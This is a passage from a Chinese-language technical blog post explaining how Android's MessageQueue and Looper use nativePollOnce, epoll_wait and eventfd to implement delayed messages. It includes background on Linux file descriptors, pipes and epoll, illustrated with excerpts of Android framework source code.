SystemClock.uptimeMillis();</span><br><span class=\"line\">            <span class=\"type\">Message</span> <span class=\"variable\">prevMsg</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"type\">Message</span> <span class=\"variable\">msg</span> <span class=\"operator\">=</span> mMessages;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (msg != <span class=\"literal\">null</span> &amp;&amp; msg.target == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (msg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (now &lt; msg.when) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 下一个消息时间未到，更新这个阻塞超时时间，for循环下一次便会利用到此时间</span></span><br><span class=\"line\">                    <span class=\"comment\">// 这里就做了一次when - now的操作，回应我上文所述</span></span><br><span class=\"line\">                    nextPollTimeoutMillis = (<span class=\"type\">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// Got a message.</span></span><br><span class=\"line\">                    mBlocked = <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (prevMsg != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        prevMsg.next = msg.next;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        mMessages = msg.next;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    msg.next = <span class=\"literal\">null</span>;</span><br><span class=\"line\">                    ...</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> msg;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// No more messages.</span></span><br><span class=\"line\">                nextPollTimeoutMillis = -<span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从上述可见，我们一开始传进来的delay延时，经过一路波折，来到了 <code>nativePollOnce(ptr, nextPollTimeoutMillis)</code> 本地方法，此方法是阻塞调用，再结合前面的 <code>nativeWake(ptr)</code> 方法，我们可以对消息机制的延时原理有一个初步认知：</p>\n<ul>\n<li>当通过 <code>postDelayed</code> 发送延时消息后，传入的时间最终会通过 <code>nativePollOnce</code> 方法进行带超时的阻塞，以达到延时的目的，时间到后阻塞结束，<code>next</code> 方法再返回消息对象给Looper。</li>\n<li>在MessageQueue的 <code>enqueueMessage</code> 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 <code>nativeWake</code> 方法打断超时未到的阻塞。</li>\n</ul>\n<p>Java层分析到此其实差不多了，但是好奇的同学自然又会思考这个阻塞不会一直占用CPU资源吗？难道这就是Android耗电的真凶！？如果这么想的话，那你还是低估了Linux。为了进一步搞清楚这个Native阻塞，我们就要深入到Android系统的Native源码了。</p>\n<h2 id=\"Native层\"><a href=\"#Native层\" class=\"headerlink\" title=\"Native层\"></a>Native层</h2><p>按照源码的规范，我们可以直接找到MessageQueue的cpp代码：<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/jni/android_os_MessageQueue.cpp;l=188;drc=master;bpv=0;bpt=1\">frameworks&#x2F;base&#x2F;core&#x2F;jni&#x2F;android_os_MessageQueue.cpp</a> 中的 <code>nativePollOnce</code> 函数：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">android_os_MessageQueue_nativePollOnce</span><span class=\"params\">(JNIEnv* env, jobject obj,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">        jlong ptr, jint timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"built_in\">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class=\"line\">    <span class=\"comment\">// 实际上是调用到了pollOnce</span></span><br><span class=\"line\">    nativeMessageQueue-&gt;<span class=\"built_in\">pollOnce</span>(env, obj, timeoutMillis);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">NativeMessageQueue::pollOnce</span><span class=\"params\">(JNIEnv* env, jobject pollObj, <span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    mPollEnv = env;</span><br><span class=\"line\">    mPollObj = pollObj;</span><br><span class=\"line\">    mLooper-&gt;<span class=\"built_in\">pollOnce</span>(timeoutMillis); <span class=\"comment\">// 哟，结果在native层还是Looper在干活哦</span></span><br><span class=\"line\">    mPollObj = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    mPollEnv = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>进一步找到 <a href=\"https://cs.android.com/android/platform/superproject/+/master:system/core/libutils/Looper.cpp;drc=master;bpv=1;bpt=1;l=211\">system&#x2F;core&#x2F;libutils&#x2F;Looper.cpp</a> 的 <code>pollOnce</code>：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollOnce</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis, <span class=\"type\">int</span>* outFd, <span class=\"type\">int</span>* outEvents, <span class=\"type\">void</span>** outData)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// timeout时间传到了这里，接着看pollInner函数</span></span><br><span class=\"line\">        result = <span class=\"built_in\">pollInner</span>(timeoutMillis);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Looper::pollInner</span><span class=\"params\">(<span class=\"type\">int</span> timeoutMillis)</span> </span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 这里会根据下一个msg的时间做修正，如果早于传入的这个timeout，那就以更早的时间进行延时，避免漏掉msg</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (timeoutMillis != <span class=\"number\">0</span> &amp;&amp; mNextMessageUptime != LLONG_MAX) &#123;</span><br><span class=\"line\">        <span class=\"type\">nsecs_t</span> now = <span class=\"built_in\">systemTime</span>(SYSTEM_TIME_MONOTONIC);</span><br><span class=\"line\">        <span class=\"type\">int</span> messageTimeoutMillis = <span class=\"built_in\">toMillisecondTimeoutDelay</span>(now, mNextMessageUptime);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (messageTimeoutMillis &gt;= <span class=\"number\">0</span></span><br><span class=\"line\">                &amp;&amp; (timeoutMillis &lt; <span class=\"number\">0</span> || messageTimeoutMillis &lt; timeoutMillis)) &#123;</span><br><span class=\"line\">            timeoutMillis = messageTimeoutMillis;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 初始返回值就是唤醒</span></span><br><span class=\"line\">    <span class=\"type\">int</span> result = POLL_WAKE;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 这里设置标志位，准备进入idle状态（epoll_wait会挂起释放CPU资源）</span></span><br><span class=\"line\">    mPolling = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">epoll_event</span> eventItems[EPOLL_MAX_EVENTS];</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】epoll_wait系统调用就是整个消息机制阻塞的真正位置，阻塞等待同时可以读取管道的通知，下文详解</span></span><br><span class=\"line\">    <span class=\"type\">int</span> eventCount = <span class=\"built_in\">epoll_wait</span>(mEpollFd.<span class=\"built_in\">get</span>(), eventItems, EPOLL_MAX_EVENTS, timeoutMillis);</span><br><span class=\"line\">    <span class=\"comment\">// epoll_wait返回事件（注意这里返回有可能是timeout时间到了，也可能是中途被唤醒），退出idle状态，重新取得CPU执行机会</span></span><br><span class=\"line\">    mPolling = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 返回-1的话表示error了，直接goto到Done代码行</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (eventCount &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        result = POLL_ERROR;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> Done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 返回0表示timeout时间到了（说明这期间没有新的消息导致中途唤醒），正常Done</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (eventCount == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        result = POLL_TIMEOUT;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> Done;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 返回eventCount大于0，说明timeout未到，就有新的事件写入管道导致提前唤醒</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; eventCount; i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> fd = eventItems[i].data.fd;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> epollEvents = eventItems[i].events;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (fd == mWakeEventFd.<span class=\"built_in\">get</span>()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (epollEvents &amp; EPOLLIN) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">awoken</span>(); <span class=\"comment\">// 【重点】被唤醒了</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                ...</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">Done: ;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>pollInner</code> 代码很长，但其实核心就是 <code>epoll_wait</code> 这个系统调用，我们先大概看看它的函数定义（<a href=\"https://man7.org/linux/man-pages/man2/epoll_wait.2.html\">epoll_wait(2) — Linux manual page</a> ， <a href=\"https://zh.wikipedia.org/wiki/Epoll\">Epoll-wiki</a>），后文再详解：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event *events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>epoll_wait这里也是<strong>整个Android消息机制阻塞的真正位置，阻塞等待期间可以保证线程进入休眠状态，不占用CPU资源，同时监听所注册的事件</strong>。</p>\n<p>简单地讲，就是等待注册在文件描述符 <code>epfd</code> 上的事件，等事件产生的时候，传入的events数组会被填充，以便于epoll_wait返回后处理事件，也就是我们上面源码中 <code>for (int i = 0; i &lt; eventCount; i++)</code> 干的事情。所以这个epoll应该是一个<strong>事件驱动的机制</strong>。</p>\n<p>为什么不着急讲上面的 <code>awoken()</code> 函数，因为在此之前，我们必须基本了解Linux的<strong>文件描述符</strong>（fd）、<strong>管道</strong>（pipe）和<strong>epoll</strong>机制，有了这些预备知识我们就能明白一切了。</p>\n<h2 id=\"内核知识简介\"><a href=\"#内核知识简介\" class=\"headerlink\" title=\"内核知识简介\"></a>内核知识简介</h2><h4 id=\"文件描述符（File-Descriptor）\"><a href=\"#文件描述符（File-Descriptor）\" class=\"headerlink\" title=\"文件描述符（File Descriptor）\"></a>文件描述符（File Descriptor）</h4><p>以下部分简称FD。摘录<a href=\"https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6\">维基百科的概念</a>：</p>\n<blockquote>\n<p>计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p>\n</blockquote>\n<p>概念看起来有点抽象，在理解FD之前我们需要感悟Linux的设计思想：<strong>一切皆文件</strong>。“Linux中一切都可以看作文件，包括普通文件、链接文件、Socket以及设备驱动等，对其进行相关操作时，都可能会创建对应的文件描述符。文件描述符是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有I&#x2F;O操作相关的系统调用（例如read、write等）都需要通过文件描述符。”</p>\n<p>可见，在Linux中，FD就是一种宝贵的系统资源，就像工业时代的石油一样，没有它，我们的文件系统就无法运转。本质上，一个Linux进程启动后，会在内核空间生成文件描述符表（FD Table），记录当前进程所有可用的FD，也即映射着该进程所有打开的文件，这里引用一张其他大佬的<a href=\"http://c.biancheng.net/view/3066.html\">图</a>，就更形象了：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/9419696c40b1897d7d7d7f46ba2ffd63.gif\"></p>\n<p><strong>FD实际上就是文件描述符表的数组下标（所以是非负整数）</strong>。通俗地总结就是系统操作I&#x2F;O资源的钥匙。更多细节大家可自行查阅或参考文末链接，此处点到为止。</p>\n<p>我们由此还可以萌生一个初步概念：有了方便的文件操作，我们就能实现跨进程通信了。</p>\n<h4 id=\"管道（pipe）\"><a href=\"#管道（pipe）\" class=\"headerlink\" title=\"管道（pipe）\"></a>管道（pipe）</h4><p>那么什么又是管道呢？同样地，我们先看看<a href=\"https://zh.wikipedia.org/wiki/%E7%AE%A1%E9%81%93_(Unix)\">百科的概念</a>：</p>\n<blockquote>\n<p>在类Unix操作系统（以及一些其他借用了这个设计的操作系统，如Windows）中，管道（英语：Pipeline）是一系列将标准输入输出链接起来的进程，其中每一个进程的输出被直接作为下一个进程的输入。<br>这个概念是由道格拉斯·麦克罗伊为Unix命令行发明的，因与物理上的管道相似而得名。</p>\n</blockquote>\n<p>这个概念还算比较形象，管道就是通常用于进程间通信的一种机制。如其名，就像水管的一端输水，另一端接水。pipe的发明人发现系统操作执行命令的时候，经常有需求要将一个程序的输出交给另一个程序进行处理，这种操作可以使用输入输出配合文件来实现，比如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> &gt; abc.txt <span class=\"comment\"># 把当前目录的文件列表输入到abc文本</span></span><br><span class=\"line\">grep xxx abc.txt <span class=\"comment\"># adb文本作为输出，让grep程序查找内容xxx</span></span><br></pre></td></tr></table></figure>\n\n<p>这确实很麻烦，管道的出现简化了这个操作，现在我们可以用管道符（通常这么称呼）竖线来连接两个命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> | grep xxx</span><br></pre></td></tr></table></figure>\n\n<p>达到同样的效果，还不需要显式地产生文件。shell会用一个管道连接两个进程的输入输出，以此实现跨进程通信。因此，我们可以把管道的本质理解成一个文件，前一个进程用写的方式打开文件，后一个进程用读的方式打开。所以管道的系统调用函数是这样的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pipe</span><span class=\"params\">(<span class=\"type\">int</span> pipefd[<span class=\"number\">2</span>])</span>;</span><br></pre></td></tr></table></figure>\n\n<p>函数调用后会创建2个文件描述符，即填充pipefd数组，其中pipefd[0]是读方式打开，pipefd[1]是写方式打开，分别作为管道的读和写描述符。管道虽然形式上是文件，但本身并不占用磁盘存储空间，而是占用的内存空间，所以管道是一个操作方式和文件相同的内存缓冲区（所以我们也不用狭隘地理解Linux中的文件，并非存在磁盘上的才叫文件）。<strong>写入管道的数据会被缓存到直到另一端读取为止，所以上述命令是阻塞的</strong>，在ls没有结果产生之前grep并不会执行。</p>\n<p>所以在实践中，我们通常让一个进程关闭读端，另一个进程关闭写端，以实现单工通信，引用一张其他大佬的<a href=\"https://zhuanlan.zhihu.com/p/58489873\">图</a>：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/img_convert/ed02bb53a696f14c3e854c2573a164b8.png\"></p>\n<p>类似这样的代码，了解其形式即可（更多细节可以参考文末链接）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 父进程fork产生子进程后</span></span><br><span class=\"line\"><span class=\"comment\">// parent进程</span></span><br><span class=\"line\">read(pipefd[<span class=\"number\">0</span>], ...);</span><br><span class=\"line\"><span class=\"comment\">// child进程</span></span><br><span class=\"line\">write(pipefd[<span class=\"number\">1</span>], ...);</span><br></pre></td></tr></table></figure>\n\n<p>此外，我们必须清楚的是，<strong>pipe并不只能用于跨进程通信，在同一个进程内当然也是可用的</strong>。</p>\n<h4 id=\"epoll\"><a href=\"#epoll\" class=\"headerlink\" title=\"epoll\"></a>epoll</h4><p>了解文件描述符和管道后，我们终于可以讲epoll机制了。依然先看定义：</p>\n<blockquote>\n<p>epoll是Linux内核的可扩展I&#x2F;O事件通知机制。于Linux 2.5.44首度登场，它设计目的旨在取代既有POSIX select(2)与poll(2)系统函数，让需要大量操作文件描述符的程序得以发挥更优异的性能。epoll 实现的功能与 poll 类似，都是监听多个文件描述符上的事件。<br>epoll 通过使用红黑树(RB-tree)搜索被监控的文件描述符(file descriptor)。在 epoll 实例上注册事件时，epoll 会将该事件添加到 epoll 实例的红黑树上并注册一个回调函数，当事件发生时会将事件添加到就绪链表中。</p>\n</blockquote>\n<p>说明epoll是一种I&#x2F;O<strong>事件通知机制</strong>（事件驱动的，犹如观察者模式）。我们上文提到管道机制，需要一端写数据另一端才能读数据，但在实践中，我们往往不能这样无尽地等待，而是<strong>希望有一个监听，你什么时候写再通知我去读</strong>。</p>\n<p>在epoll出现之前，也有诸如select和poll这样的监听机制，但是效率比较低，有些需要无差别遍历FD，虽然也是非阻塞，但唤醒后要轮询I&#x2F;O，或者是有FD监听数量上限等缺点，具体此处不赘述。</p>\n<p>总之，epoll解决了这些问题，实现了高性能的I&#x2F;O多路复用，还使用<a href=\"https://www.cnblogs.com/huxiao-tee/p/4660352.html\">mmap</a>加速内核与用户空间的消息传递。<a href=\"https://man7.org/linux/man-pages/man7/epoll.7.html\">epoll的系统调用</a>也比较简单，就3个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在内核中创建epoll实例并返回一个epoll文件描述符</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create</span><span class=\"params\">(<span class=\"type\">int</span> size)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_create1</span><span class=\"params\">(<span class=\"type\">int</span> flags)</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向epfd（上面create的）对应的epoll实例添加、修改或删除对fd（即第3个参数）上事件event的监听</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_ctl</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"type\">int</span> op, <span class=\"type\">int</span> fd, <span class=\"keyword\">struct</span> epoll_event *event)</span>;</span><br><span class=\"line\"><span class=\"comment\">// 这个函数我们上文就提到了，它等待注册在epfd上面的事件，事件从events参数中带出</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">epoll_wait</span><span class=\"params\">(<span class=\"type\">int</span> epfd, <span class=\"keyword\">struct</span> epoll_event *events, <span class=\"type\">int</span> maxevents, <span class=\"type\">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>epoll内部实现还是比较复杂的，用红黑树结构管理fd，双向链表结构管理回调的事件，具体可以参考文末链接。简单的讲一下原理，<code>epoll_ctl</code> 函数会把传入的fd和event进行存储，并与相应的设备驱动程序建立关系，当相应的事件发生时，就会调用内部的回调函数将事件添加到链表中，最终通知线程唤醒，<code>epoll_wait</code> 得以返回。没有事件发生时，<code>epoll_wait</code> 就是挂起状态。 </p>\n<p>这里<strong>注意不要混淆了</strong>：epfd是epoll程序实例的描述符或者说索引；fd是与你想要监听的事件所对应的描述符，最终读写管道依赖的也是这个fd。</p>\n<h2 id=\"回溯Native层\"><a href=\"#回溯Native层\" class=\"headerlink\" title=\"回溯Native层\"></a>回溯Native层</h2><p>终于搞清楚了epoll，我们再回去看MessageQueue和Looper的Native源码，就非常清晰了。</p>\n<p>还记得我们上文MQ中的mPtr变量吗，实际上在MQ的构造方法中进行了初始化：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MessageQueue(<span class=\"type\">boolean</span> quitAllowed) &#123;</span><br><span class=\"line\">    mQuitAllowed = quitAllowed;</span><br><span class=\"line\">    mPtr = nativeInit(); <span class=\"comment\">// 本地调用</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以在Native层也有一个MQ对象，mPtr是MQ在Native层的一个映射引用，方便上层寻址访问：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> jlong <span class=\"title\">android_os_MessageQueue_nativeInit</span><span class=\"params\">(JNIEnv* env, jclass clazz)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"keyword\">new</span> <span class=\"built_in\">NativeMessageQueue</span>();</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">reinterpret_cast</span>&lt;jlong&gt;(nativeMessageQueue); <span class=\"comment\">// long类型，实际上就是个地址</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NativeMessageQueue::<span class=\"built_in\">NativeMessageQueue</span>() : <span class=\"built_in\">mPollEnv</span>(<span class=\"literal\">NULL</span>), <span class=\"built_in\">mPollObj</span>(<span class=\"literal\">NULL</span>), <span class=\"built_in\">mExceptionObj</span>(<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    mLooper = Looper::<span class=\"built_in\">getForThread</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mLooper == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        mLooper = <span class=\"keyword\">new</span> <span class=\"built_in\">Looper</span>(<span class=\"literal\">false</span>); <span class=\"comment\">// Native的MQ在初始化时还创建了Looper的实例</span></span><br><span class=\"line\">        Looper::<span class=\"built_in\">setForThread</span>(mLooper);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>再看看Looper的初始化过程：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Looper::<span class=\"built_in\">Looper</span>(<span class=\"type\">bool</span> allowNonCallbacks)</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// eventfd系统函数创建一个文件描述符，赋值给mWakeEventFd（唤醒事件描述符），待会儿管道的读写都会在此FD上进行</span></span><br><span class=\"line\">    mWakeEventFd.<span class=\"built_in\">reset</span>(<span class=\"built_in\">eventfd</span>(<span class=\"number\">0</span>, EFD_NONBLOCK | EFD_CLOEXEC));</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">// 【重点】构造了epoll实例</span></span><br><span class=\"line\">    <span class=\"built_in\">rebuildEpollLocked</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::rebuildEpollLocked</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果已经有epoll实例对应的描述符，先重置</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mEpollFd &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        mEpollFd.<span class=\"built_in\">reset</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 创建新的epoll实例和唤醒管道（wake pipe）</span></span><br><span class=\"line\">    <span class=\"comment\">// 【重点】此处用epoll_create1函数创建了实例并将返回赋值给mEpollFd描述符</span></span><br><span class=\"line\">    mEpollFd.<span 